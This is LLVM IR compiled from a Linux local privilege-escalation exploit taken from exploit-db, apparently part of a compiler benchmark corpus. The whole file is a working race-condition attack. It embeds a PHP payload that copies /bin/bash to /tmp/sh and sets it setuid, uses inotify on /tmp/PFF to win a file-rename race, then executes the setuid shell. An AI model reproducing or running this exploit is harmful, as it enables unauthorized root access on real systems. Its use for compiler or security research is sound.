; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_33145.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_33145.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.inotify_event = type { i32 }

@.str = private unnamed_addr constant [58 x i8] c"<? system(\22cp /bin/bash /tmp/sh; chmod 4777 /tmp/sh\22); ?>\00", align 1
@.str.1 = private unnamed_addr constant [18 x i8] c"-=*************-\0A\00", align 1
@FILEB = common dso_local global i8* null, align 8
@O_CREAT = common dso_local global i32 0, align 4
@O_RDWR = common dso_local global i32 0, align 4
@O_EXCL = common dso_local global i32 0, align 4
@MODEZ = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [32 x i8] c"[+] created abritrary code: %s\0A\00", align 1
@.str.3 = private unnamed_addr constant [9 x i8] c"/tmp/PFF\00", align 1
@IN_CREATE = common dso_local global i32 0, align 4
@FILEA = common dso_local global i8* null, align 8
@.str.4 = private unnamed_addr constant [14 x i8] c"[+] %s => %s\0A\00", align 1
@.str.5 = private unnamed_addr constant [30 x i8] c"[+] executing arbitrary code\0A\00", align 1
@.str.6 = private unnamed_addr constant [22 x i8] c"[+] racism complete \0A\00", align 1
@.str.7 = private unnamed_addr constant [8 x i8] c"/tmp/sh\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca %struct.inotify_event, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str, i64 0, i64 0), i8** %9, align 8
  %11 = call i32 (...) @inotify_init()
  store i32 %11, i32* %7, align 4
  %12 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.1, i64 0, i64 0))
  %13 = load i8*, i8** @FILEB, align 8
  %14 = load i32, i32* @O_CREAT, align 4
  %15 = load i32, i32* @O_RDWR, align 4
  %16 = or i32 %14, %15
  %17 = load i32, i32* @O_EXCL, align 4
  %18 = or i32 %16, %17
  %19 = load i32, i32* @MODEZ, align 4
  %20 = call i32 @open(i8* %13, i32 %18, i32 %19)
  store i32 %20, i32* %6, align 4
  %21 = icmp sgt i32 %20, 0
  br i1 %21, label %22, label %30

22:                                               ; preds = %2
  %23 = load i32, i32* %6, align 4
  %24 = load i8*, i8** %9, align 8
  %25 = load i8*, i8** %9, align 8
  %26 = call i32 @strlen(i8* %25)
  %27 = call i32 @write(i32 %23, i8* %24, i32 %26)
  %28 = load i32, i32* %6, align 4
  %29 = call i32 @close(i32 %28)
  br label %30

30:                                               ; preds = %22, %2
  %31 = load i8*, i8** @FILEB, align 8
  %32 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.2, i64 0, i64 0), i8* %31)
  %33 = load i32, i32* %7, align 4
  %34 = load i32, i32* @IN_CREATE, align 4
  %35 = call i32 @inotify_add_watch(i32 %33, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.3, i64 0, i64 0), i32 %34)
  store i32 %35, i32* %8, align 4
  %36 = load i32, i32* %7, align 4
  %37 = call i32 @read(i32 %36, %struct.inotify_event* %10, i32 4)
  %38 = load i8*, i8** @FILEB, align 8
  %39 = load i8*, i8** @FILEA, align 8
  %40 = call i32 @rename(i8* %38, i8* %39)
  %41 = load i8*, i8** @FILEB, align 8
  %42 = load i8*, i8** @FILEA, align 8
  %43 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.4, i64 0, i64 0), i8* %41, i8* %42)
  %44 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.5, i64 0, i64 0))
  %45 = call i32 @sleep(i32 2)
  %46 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.6, i64 0, i64 0))
  %47 = call i32 @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i64 0, i64 0), i32 0)
  %48 = load i32, i32* %3, align 4
  ret i32 %48
}

declare dso_local i32 @inotify_init(...) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @open(i8*, i32, i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @inotify_add_watch(i32, i8*, i32) #1

declare dso_local i32 @read(i32, %struct.inotify_event*, i32) #1

declare dso_local i32 @rename(i8*, i8*) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @execl(i8*, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
